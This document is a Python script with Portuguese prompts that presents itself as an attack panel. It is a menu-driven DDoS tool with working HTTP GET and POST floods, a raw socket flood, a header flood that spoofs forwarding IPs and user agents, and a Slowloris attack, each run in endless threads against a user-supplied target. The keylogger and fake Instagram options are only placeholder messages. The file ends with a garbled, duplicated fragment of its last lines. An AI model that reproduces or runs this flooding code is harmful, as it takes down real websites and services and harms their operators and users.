
import os, socket, threading, requests, random

def ddos_http_get():
    url = input("URL: ")
    threads = int(input("Threads: "))
    def attack():
        while True:
            try:
                requests.get(url)
                print("GET bombando")
            except: pass
    for _ in range(threads): threading.Thread(target=attack).start()

def ddos_http_post():
    url = input("URL: ")
    threads = int(input("Threads: "))
    data = {"data": "LekDoBlack"}
    def attack():
        while True:
            try:
                requests.post(url, data=data)
                print("POST voando")
            except: pass
    for _ in range(threads): threading.Thread(target=attack).start()

def ddos_socket_raw():
    host = input("Host/IP: ")
    port = int(input("Porta: "))
    def attack():
        while True:
            try:
                s = socket.socket()
                s.connect((host, port))
                s.send(random._urandom(1024))
                s.close()
                print("Socket enviado")
            except: pass
    for _ in range(50): threading.Thread(target=attack).start()

def ddos_headers():
    url = input("URL: ")
    def attack():
        while True:
            try:
                headers = {
                    "User-Agent": random.choice(["LekDoBlack", "Googlebot", "curl/7.68.0"]),
                    "Referer": "https://pornhub.com",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.1.1"
                }
                requests.get(url, headers=headers)
                print("Cabeçalho spamado")
            except: pass
    for _ in range(50): threading.Thread(target=attack).start()

def ddos_slowloris():
    host = input("Host alvo: ")
    port = 80
    def attack():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send("GET / HTTP/1.1\r\n".encode())
            while True:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
        except: pass
    for _ in range(50): threading.Thread(target=attack).start()

def keylogger_fake():
    print("Keylogger fake ativado: app de namoro + webhook fake.")

def painel_fake_instagram():
    print("AINDA EM DESENVOLVIMENTO!!!")

def menu():
    while True:
        print("\nPAINEL WAVRS EM DESENVOLVIMENTO !")
        print("[1] HTTP GET Flood")
        print("[2] HTTP POST Flood")
        print("[3] Socket RAW Flood")
        print("[4] Header Bomb")
        print("[5] Slowloris")
        print("[6] Keylogger Fake")
        print("[7] Painel Fake Instagram")
        print("[0] Sair")
        op = input(">> ")
        if op == "1": ddos_http_get()
        elif op == "2": ddos_http_post()
        elif op == "3": ddos_socket_raw()
        elif op == "4": ddos_headers()
        elif op == "5": ddos_slowloris()
        elif op == "6": keylogger_fake()
        elif op == "7": painel_fake_instagram()
        elif op == "0": break
        else: print("Opção inválida.")
        input("ENTER pra voltar...")

menu()
oltar...")

menu()
